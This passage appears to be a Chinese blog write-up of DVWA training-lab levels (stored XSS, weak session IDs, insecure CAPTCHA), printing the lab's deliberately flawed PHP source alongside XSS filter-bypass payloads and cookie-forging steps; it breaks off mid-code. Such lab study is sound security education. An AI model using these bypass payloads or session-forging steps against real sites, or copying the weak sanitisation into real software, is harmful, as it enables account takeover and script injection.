<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Get input </span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    trims(tring,charlist)函数移除字符串两侧的空白字符或其他预定义字符，包括、\t、\n、\x0b、\r以及空格</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-variable">$message</span> = trim( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );<br>    <span class="hljs-variable">$name</span>    = trim( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Sanitize message input(string)</span><br>    <span class="hljs-comment">//stripslashes函数移除字符串中的反斜杠</span><br>    <span class="hljs-comment">//mysqli_real_escape_string(string,connection)</span><br>    <span class="hljs-comment">//函数会对字符串中的特殊符号（\x00，\n，\r，\，‘，“，\x1a）进行转义。</span><br>    <span class="hljs-variable">$message</span> = stripslashes( <span class="hljs-variable">$message</span> );<br>    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>    <span class="hljs-comment">// Sanitize name input</span><br>    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>    <span class="hljs-comment">// Update database</span><br>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="hljs-subst">$message</span>&#x27;, &#x27;<span class="hljs-subst">$name</span>&#x27; );&quot;</span>;<br>    <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>    <span class="hljs-comment">//mysql_close();</span><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>源码中出现了trim函数用法如下：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-13-48-28.png" alt="trim函数用法" class="lazyload"></p>
<p>出现了stripslashes()函数用法如下：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-13-49-27.png" alt="stripslashes函数用法" class="lazyload"><br>这里用于删除反斜杠，可用于清理数据库中或者从html表单中取回的数据<br>漏洞复现：<br>这里对xss方面没有做过滤和检查，而且数据将直接被存储到数据库中，因此存在存储型xss<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-14-29-32.png" alt="存储型xss" class="lazyload"><br>同样的在message中也可以弹窗。在做其他的时候清楚表</p>
<p><strong>medium</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$message</span> = trim( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );<br>    <span class="hljs-variable">$name</span>    = trim( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Sanitize message input</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    strip_tags() 函数剥去字符串中的HTML、XML以及PHP的标签，但允许使用&lt;b&gt;标签</span><br><span class="hljs-comment">     addslashes() 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-variable">$message</span> = strip_tags( addslashes( <span class="hljs-variable">$message</span> ) );<br>    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>    <span class="hljs-variable">$message</span> = htmlspecialchars( <span class="hljs-variable">$message</span> );<br><br>    <span class="hljs-comment">// Sanitize name input</span><br>    <span class="hljs-variable">$name</span> = str_replace( <span class="hljs-string">&#x27;&lt;script&gt;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$name</span> );<br>    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>    <span class="hljs-comment">// Update database</span><br>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="hljs-subst">$message</span>&#x27;, &#x27;<span class="hljs-subst">$name</span>&#x27; );&quot;</span>;<br>    <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>    <span class="hljs-comment">//mysql_close();</span><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>message处使用了htmlspecialchars函数，将字符全部转化为了html实体，因此message处无法使用xss攻击<br>name处做了长度限制，会把script标签转化为空考虑使用大小写或者双写绕过</p>
<p>漏洞复现：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">大小写绕过：&lt;scRIPt&gt;alert(1)&lt;/SCript&gt;<br>双写绕过：&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/script&gt;<br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-14-52-30.png" alt="第一部分绕过" class="lazyload"><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-14-53-18.png" alt="第二部分" class="lazyload"></p>
<p><strong>high</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$message</span> = trim( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );<br>    <span class="hljs-variable">$name</span>    = trim( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Sanitize message input</span><br>    <span class="hljs-variable">$message</span> = strip_tags( addslashes( <span class="hljs-variable">$message</span> ) );<br>    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>    <span class="hljs-variable">$message</span> = htmlspecialchars( <span class="hljs-variable">$message</span> );<br><br>    <span class="hljs-comment">// Sanitize name input</span><br>    <span class="hljs-variable">$name</span> = preg_replace( <span class="hljs-string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$name</span> );<br>    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>    <span class="hljs-comment">// Update database</span><br>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="hljs-subst">$message</span>&#x27;, &#x27;<span class="hljs-subst">$name</span>&#x27; );&quot;</span>;<br>    <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>    <span class="hljs-comment">//mysql_close();</span><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>

<p>message处与medium难度没有做太多的变化，因此不考虑这里，name处对script标签做了各种过滤，我们考虑换标签img<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-14-57-45.png" alt="图片绕过形成xss" class="lazyload"></p>
<p><strong>impossible</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Check Anti-CSRF token</span><br>    checkToken( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$message</span> = trim( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );<br>    <span class="hljs-variable">$name</span>    = trim( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Sanitize message input</span><br>    <span class="hljs-variable">$message</span> = stripslashes( <span class="hljs-variable">$message</span> );<br>    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>    <span class="hljs-variable">$message</span> = htmlspecialchars( <span class="hljs-variable">$message</span> );<br><br>    <span class="hljs-comment">// Sanitize name input</span><br>    <span class="hljs-variable">$name</span> = stripslashes( <span class="hljs-variable">$name</span> );<br>    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>    <span class="hljs-variable">$name</span> = htmlspecialchars( <span class="hljs-variable">$name</span> );<br><br>    <span class="hljs-comment">// Update database</span><br>    <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;prepare( <span class="hljs-string">&#x27;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&#x27;</span> );<br>    <span class="hljs-variable">$data</span>-&gt;bindParam( <span class="hljs-string">&#x27;:message&#x27;</span>, <span class="hljs-variable">$message</span>, PDO::PARAM_STR );<br>    <span class="hljs-variable">$data</span>-&gt;bindParam( <span class="hljs-string">&#x27;:name&#x27;</span>, <span class="hljs-variable">$name</span>, PDO::PARAM_STR );<br>    <span class="hljs-variable">$data</span>-&gt;execute();<br>&#125;<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br>generateSessionToken();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>这里对name和message都是用了htmlspecialchars函数做了过滤，还添加了token值进一步提高了安全性。</p>
<h2 id="DVWA-–-Weak-Session-ID-弱会话"><a href="#DVWA-–-Weak-Session-ID-弱会话" class="headerlink" title="DVWA – Weak Session ID(弱会话)"></a>DVWA – Weak Session ID(弱会话)</h2><p>弱会话是指用户访问服务器的时候，一般服务器都会分配一个身份证session id给用户，用于标识。用户拿到session id后就会保存到cookie中，之后拿cookie在访问服务器时，服务器就知道你是谁了。</p>
<p>但session id过于简单就会容易被人伪造。根本不需要知道用户的密码就能访问用户服务器的内容。</p>
<p><strong>low</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$html</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="hljs-string">&quot;POST&quot;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;last_session_id&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;last_session_id&#x27;</span>] = <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-comment">//服务器每次生成的session_id加1给客户端</span><br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;last_session_id&#x27;</span>]++;<br>    <span class="hljs-variable">$cookie_value</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;last_session_id&#x27;</span>];<br>    setcookie(<span class="hljs-string">&quot;dvwaSession&quot;</span>, <span class="hljs-variable">$cookie_value</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>漏洞复现：<br>如果session中的last_session_id不存在就设为0，生成cookie时就在cookies上dvwasessionId+1<br>首先点击按钮用burp抓包<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-15-54-45.png" alt="抓包" class="lazyload"><br>将抓到的cookie复制下来：<br><code>Cookie: dvwaSession=1; PHPSESSID=ha1df1ke8hmua8h2d9pd7j11qb; security=low</code><br>然后新打开一个页面，将刚才复制的cookie加入就可以实现直接登录不需要输密码(在这里需要清楚浏览器的cookie值)<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-16-20-40.png" alt="后续流程" class="lazyload"></p>
<p><strong>medium</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$html</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="hljs-string">&quot;POST&quot;</span>) &#123;<br>    <span class="hljs-variable">$cookie_value</span> = time();<br>    <span class="hljs-comment">//返回当前时间的Unix时间戳，并格式化为日期</span><br>    <span class="hljs-comment">//time() 函数返回自 Unix 纪元（January 1 1970 00:00:00 GMT）起的当前时间的秒数</span><br>    setcookie(<span class="hljs-string">&quot;dvwaSession&quot;</span>, <span class="hljs-variable">$cookie_value</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>这里通过时间戳来生成的session，可以通过时间戳转换工具生成时间戳绕过 <a target="_blank" rel="noopener" href="https://tool.lu/timestamp/">时间戳生成工具</a><br>漏洞复现：<br>抓包，保存cookie信息<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-16-27-39.png" alt="获取cookie信息" class="lazyload"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">Cookie: dvwaSession=1679300781; PHPSESSID=9g6n98glasehppc1148qa3hdr6; security=medium<br></code></pre></td></tr></table></figure>

<p>打开新标签页清空cookie信息，抓包访问靶场的弱会话地址，修改包中的cookie信息<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-16-33-27.png" alt="改包放行" class="lazyload"><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-16-34-41.png" alt="成功访问" class="lazyload"></p>
<p><strong>high</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$html</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="hljs-string">&quot;POST&quot;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;last_session_id_high&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;last_session_id_high&#x27;</span>] = <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;last_session_id_high&#x27;</span>]++;<br>    <span class="hljs-variable">$cookie_value</span> = md5(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;last_session_id_high&#x27;</span>]);<br>    setcookie(<span class="hljs-string">&quot;dvwaSession&quot;</span>, <span class="hljs-variable">$cookie_value</span>, time()+<span class="hljs-number">3600</span>, <span class="hljs-string">&quot;/vulnerabilities/weak_id/&quot;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_HOST&#x27;</span>], <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    setcookie(name,value,expire,path,domain,secure,httponly)</span><br><span class="hljs-comment">    参数                  描述</span><br><span class="hljs-comment">    name         必需。规定cookie的名称。</span><br><span class="hljs-comment">    value         必需。规定cookie的值。</span><br><span class="hljs-comment">    expire       可选。规定cookie的有效期。</span><br><span class="hljs-comment">    path         可选。规定cookie的服务器路径。</span><br><span class="hljs-comment">    domain         可选。规定cookie的域名。</span><br><span class="hljs-comment">    secure         可选。规定是否通过安全的HTTPS连接来传输cookie。</span><br><span class="hljs-comment">    httponly     可选。规定是否Cookie仅可通过HTTP协议访问。</span><br><span class="hljs-comment">    */</span><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>发现sessionId，这种使用了md5解密进行尝试发现是个2，猜测可能是low级别上进行md5加密<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-16-53-50.png" alt="查看" class="lazyload"><br>查看session的值是low的进行md5加密<br>其余操作步骤和low相同</p>
<p><strong>impossible</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$html</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="hljs-string">&quot;POST&quot;</span>) &#123;<br>    <span class="hljs-variable">$cookie_value</span> = sha1(mt_rand() . time() . <span class="hljs-string">&quot;Impossible&quot;</span>);<br>    <span class="hljs-comment">//随机数+时间戳+固定字符impossible在进行sha1运算</span><br>    setcookie(<span class="hljs-string">&quot;dvwaSession&quot;</span>, <span class="hljs-variable">$cookie_value</span>, time()+<span class="hljs-number">3600</span>, <span class="hljs-string">&quot;/vulnerabilities/weak_id/&quot;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_HOST&#x27;</span>], <span class="hljs-literal">true</span>, <span class="hljs-literal">true</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>这里$cookie_value采用随机数+时间戳+固定字符串”Impossible”，再进行sha1运算，完全不能猜测到dvwaSession的值。</p>
<h2 id="DVWA-–-Insecure-CAPTCHA-不安全的验证码"><a href="#DVWA-–-Insecure-CAPTCHA-不安全的验证码" class="headerlink" title="DVWA – Insecure CAPTCHA(不安全的验证码)"></a>DVWA – Insecure CAPTCHA(不安全的验证码)</h2><p>不安全的验证码(insecure captcha)全程Completely Automated Public Turing Test to Tell Computers and Humans Apart，中文名是全自动区分计算机和人类的图灵测试，关于这一项其实是在验证码的流程出现了逻辑漏洞。<br>验证流程：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-20-17-02-30.png" alt="验证流程" class="lazyload"></p>
<p>在这里由于访问不到Google的验证码api，过于麻烦还需要翻墙，只需要明白漏洞原理即可。</p>
<p><strong>Low</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//第一阶段，验证身份 验证阶段step为1</span><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Change&#x27;</span> ] ) &amp;&amp; ( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;step&#x27;</span> ] == <span class="hljs-string">&#x27;1&#x27;</span> ) ) &#123;<br>    <span class="hljs-comment">// Hide the CAPTCHA form 隐藏验证码表单</span><br>    <span class="hljs-variable">$hide_form</span> = <span class="hljs-literal">true</span>;<br><br>    <span class="hljs-comment">// Get input 得到用户的新密码及确认密码</span><br>    <span class="hljs-variable">$pass_new</span>  = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;password_new&#x27;</span> ];<br>    <span class="hljs-variable">$pass_conf</span> = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;password_conf&#x27;</span> ];<br><br>    <span class="hljs-comment">// Check CAPTCHA from 3rd party 使用第三方进行身份验证</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    recaptcha_check_answer($privkey,$remoteip, $challenge,$response)</span><br><span class="hljs-comment">    参数$privkey是服务器申请的private key，$remoteip是用户的ip，$challenge是recaptcha_challenge_field字段的值，来自前端页面 ，$response是recaptcha_response_field字段的值。函数返回ReCaptchaResponse class的实例，ReCaptchaResponse类有2个属性 ：</span><br><span class="hljs-comment">    $is_valid是布尔型的，表示校验是否有效，</span><br><span class="hljs-comment">    $error是返回的错误代码。</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-variable">$resp</span> = recaptcha_check_answer(<br>        <span class="hljs-variable">$_DVWA</span>[ <span class="hljs-string">&#x27;recaptcha_private_key&#x27;</span>],<br>        <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;g-recaptcha-response&#x27;</span>]<br>    );<br><br>    <span class="hljs-comment">// Did the CAPTCHA fail? 验证失败时</span><br>    <span class="hljs-keyword">if</span>( !<span class="hljs-variable">$resp</span> ) &#123;<br>        <span class="hljs-comment">// What happens when the CAPTCHA was entered incorrectly</span><br>        <span 